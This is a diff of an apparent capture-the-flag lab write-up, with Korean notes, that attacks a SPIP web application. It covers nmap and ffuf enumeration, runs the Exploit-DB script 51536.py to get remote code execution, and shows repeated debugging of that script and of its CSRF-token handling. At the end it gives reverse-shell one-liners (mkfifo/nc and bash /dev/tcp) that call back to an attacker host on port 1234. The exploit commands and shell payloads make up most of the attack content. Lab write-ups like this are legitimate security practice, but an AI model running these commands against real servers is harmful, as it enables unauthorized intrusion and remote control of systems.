@@ -1,11 +1,11 @@
-# 10.201.39.21
+# 10.201.43.138
 
-nmap -Pn -sV -sC -oN nmap.txt --open 10.201.39.21
+nmap -Pn -sV -sC -oN nmap.txt --open 10.201.43.138
 
 ┌──(root㉿docker-desktop)-[/]
-└─# nmap -Pn -sV -sC -oN nmap.txt --open 10.201.39.21
+└─# nmap -Pn -sV -sC -oN nmap.txt --open 10.201.43.138
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-21 15:03 UTC
-Nmap scan report for 10.201.39.21
+Nmap scan report for 10.201.43.138
 Host is up (0.34s latency).
 Not shown: 998 closed tcp ports (reset)
 PORT STATE SERVICE VERSION
@@ -19,10 +19,10 @@ PORT STATE SERVICE VERSION
 |\_http-server-header: Apache/2.4.41 (Ubuntu)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-ffuf -u http://10.201.39.21 -H "Host:FUZZ.10.201.39.21" -w /usr/share/seclists/Discovery/DNS/namelist.txt -fs 178 -t 50 -mc 200,302
+ffuf -u http://10.201.43.138 -H "Host:FUZZ.10.201.43.138" -w /usr/share/seclists/Discovery/DNS/namelist.txt -fs 178 -t 50 -mc 200,302
 
 ┌──(root㉿docker-desktop)-[/]
-└─# ffuf -u http://10.201.39.21 -H "Host:FUZZ.10.201.39.21" -w /usr/share/seclists/Discovery/DNS/namelist.txt -fs 178
+└─# ffuf -u http://10.201.43.138 -H "Host:FUZZ.10.201.43.138" -w /usr/share/seclists/Discovery/DNS/namelist.txt -fs 178
 
         /'___\  /'___\           /'___\
        /\ \__/ /\ \__/  __  __  /\ \__/
@@ -36,9 +36,9 @@ ffuf -u http://10.201.39.21 -H "Host:FUZZ.10.201.39.21" -w /usr/share/seclists/D
 ---
 
 :: Method : GET
-:: URL : http://10.201.39.21
+:: URL : http://10.201.43.138
 :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt
-:: Header : Host: FUZZ.10.201.39.21
+:: Header : Host: FUZZ.10.201.43.138
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
@@ -60,9 +60,9 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ![](https://velog.velcdn.com/images/agnusdei1207/post/c9aee363-a145-4492-a058-9d1eabd973c6/image.png)
 
-ffuf -u "http://10.201.39.21/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/big.txt -mc all -fs 0 -fc 404
+ffuf -u "http://10.201.43.138/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/big.txt -mc all -fs 0 -fc 404
 ┌──(root㉿docker-desktop)-[/]
-└─# ffuf -u "http://10.201.39.21/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/big.txt
+└─# ffuf -u "http://10.201.43.138/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/big.txt
 
         /'___\  /'___\           /'___\
        /\ \__/ /\ \__/  __  __  /\ \__/
@@ -76,7 +76,7 @@ ffuf -u "http://10.201.39.21/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/
 ---
 
 :: Method : GET
-:: URL : http://10.201.39.21/FUZZ
+:: URL : http://10.201.43.138/FUZZ
 :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration : false
@@ -98,7 +98,7 @@ images, server-status, spip
 ![](https://velog.velcdn.com/images/agnusdei1207/post/4b46f70a-95d5-4c12-8b5a-47b174ffecf3/image.png)
 
 ![](https://velog.velcdn.com/images/agnusdei1207/post/af9a94e6-090f-4696-9601-444fa18824f8/image.png)
-http://10.201.39.21/spip/spip.php?page=login&url=spip.php%3Fpage%3Dplan&lang=fr
+http://10.201.43.138/spip/spip.php?page=login&url=spip.php%3Fpage%3Dplan&lang=fr
 
 ![](https://velog.velcdn.com/images/agnusdei1207/post/c85edd3d-63d7-4a14-8bc1-cc659a4e2aea/image.png)
 
@@ -111,7 +111,7 @@ https://github.com/PaulSec/SPIPScan?source=post_page-----a256af21d7bd-----------
 > searchsploiot -u
 > searchsploit spip
 
-# 10.201.39.21
+# 10.201.43.138
 
 ┌──(root㉿docker-desktop)-[/]
 └─# searchsploit spip
@@ -253,11 +253,11 @@ if __name__ == '__main__':
 ```
 
 ┌──(root㉿docker-desktop)-[/]
-└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.39.21 -c "id"
+└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.43.138 -c "id"
 python3: can't open file '/usr/share/exploitdb/exploits/php/webapps/51536': [Errno 2] No such file or directory
 
 ┌──(root㉿docker-desktop)-[/]
-└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.39.21 -c "id"
+└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.43.138 -c "id"
 Traceback (most recent call last):
 File "/usr/share/exploitdb/exploits/php/webapps/51536.py", line 63, in <module>
 requests.packages.urllib3.util.ssl*.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
@@ -270,7 +270,7 @@ AttributeError: module 'urllib3.util.ssl*' has no attribute 'DEFAULT_CIPHERS'
 └─# vim /usr/share/exploitdb/exploits/php/webapps/51536.py
 
 ┌──(root㉿docker-desktop)-[/]
-└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.39.21 -c "id"
+└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.43.138 -c "id"
 File "/usr/share/exploitdb/exploits/php/webapps/51536.py", line 66
 except AttributeError:
 ^^^^^^
@@ -279,23 +279,23 @@ IndentationError: expected an indented block after 'try' statement on line 64
 # 왜 못 찾지?
 
 ┌──(root㉿docker-desktop)-[/]
-└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.39.21 -c "id"
+└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.43.138 -c "id"
 [-] Unable to find Anti-CSRF token
 
 ┌──(root㉿docker-desktop)-[/]
-└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.39.21 -c "id" --verbose
+└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.43.138 -c "id" --verbose
 [-] Unable to find Anti-CSRF token
 [+] Execute this payload : s:22:"<?php system('id'); ?>";
 
 # 직접 input 확인하자 -> 대상에 input 태그가 없네? -> 다른 페이지 찾기 -> 취약점 다시 보기 -> spip.php?page=login
 
 ──(root㉿docker-desktop)-[/]
-└─# http http://10.201.39.21
+└─# http http://10.201.43.138
 
 # 탐색 -> 안 나옴
 
 ┌──(root㉿docker-desktop)-[/]
-└─# http http://10.201.39.21/spip.php
+└─# http http://10.201.43.138/spip.php
 HTTP/1.1 404 Not Found
 Connection: Keep-Alive
 Content-Length: 274
@@ -309,12 +309,12 @@ Server: Apache/2.4.41 (Ubuntu)
 ![](https://velog.velcdn.com/images/agnusdei1207/post/a9d0fb96-6adf-4e4e-91bb-cf0ea2ae1ad0/image.png)
 
 ──(root㉿docker-desktop)-[/]
-└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.39.21/spip -c "id" --verbose
+└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.43.138/spip -c "id" --verbose
 [+] Anti-CSRF token found : AKXEs4U6r36PZ5LnRZXtHvxQ/ZZYCXnJB2crlmVwgtlVVXwXn/MCLPMydXPZCL/WsMlnvbq2xARLr6toNbdfE/YV7egygXhx
 [+] Execute this payload : s:22:"<?php system('id'); ?>";
 
 ┌──(root㉿docker-desktop)-[/]
-└─# http http://10.201.39.21/spip.php?page=spip_pass
+└─# http http://10.201.43.138/spip.php?page=spip_pass
 HTTP/1.1 404 Not Found
 Connection: Keep-Alive
 Content-Length: 274
@@ -330,12 +330,12 @@ Server: Apache/2.4.41 (Ubuntu)
 <h1>Not Found</h1>
 <p>The requested URL was not found on this server.</p>
 <hr>
-<address>Apache/2.4.41 (Ubuntu) Server at 10.201.39.21 Port 80</address>
+<address>Apache/2.4.41 (Ubuntu) Server at 10.201.43.138 Port 80</address>
 </body></html>
 
 # i found it -> spip -> 한 번 더 써야함!
 
-> http http://10.201.39.21/spip/spip.php?page=spip_pass
+> http http://10.201.43.138/spip/spip.php?page=spip_pass
 
 # input 에 oubli CSRF 토큰이 hidden 처리되어 있음
 
@@ -346,14 +346,14 @@ Server: Apache/2.4.41 (Ubuntu)
 # not found token
 
 ┌──(root㉿docker-desktop)-[/]
-└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.39.21/spip/spip.php?page=spip_pass -c "id" --verbose
+└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.43.138/spip/spip.php?page=spip_pass -c "id" --verbose
 [-] Unable to find Anti-CSRF token
 [+] Execute this payload : s:22:"<?php system('id'); ?>";
 
 # without queryparam try!
 
 ┌──(root㉿docker-desktop)-[/]
-└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.39.21/spip/spip.php -c "id" --verbose
+└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.43.138/spip/spip.php -c "id" --verbose
 [+] Anti-CSRF token found : AKXEs4U6r36PZ5LnRZXtHvxQ/ZZYCXnJB2crlmVwgtlVVXwXn/MCLPMydXPZCL/WsMlnvbq2xARLr6toNbdfE/YV7egygXhx
 [+] Execute this payload : s:22:"<?php system('id'); ?>";
 
@@ -376,7 +376,7 @@ def send_payload(url, payload):
 ```
 
 ┌──(root㉿docker-desktop)-[/]
-└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.39.21/spip/spip.php -c "id" --verbose
+└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.43.138/spip/spip.php -c "id" --verbose
 [+] Anti-CSRF token found : AKXEs4U6r36PZ5LnRZXtHvxQ/ZZYCXnJB2crlmVwgtlVVXwXn/MCLPMydXPZCL/WsMlnvbq2xARLr6toNbdfE/YV7egygXhx
 [+] Execute this payload : s:22:"<?php system('id'); ?>";
 
@@ -393,7 +393,7 @@ def send_payload(url, payload):
 
 # RS
 
-python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.39.21/spip/spip.php -c "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.8.136.212 1234 >/tmp/f" --verbose
+python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.43.138/spip/spip.php -c "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.8.136.212 1234 >/tmp/f" --verbose
 
 - bash -i >& /dev/tcp/10.8.136.212/1234 0>&1
 - rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.8.136.212 1234 >/tmp/f
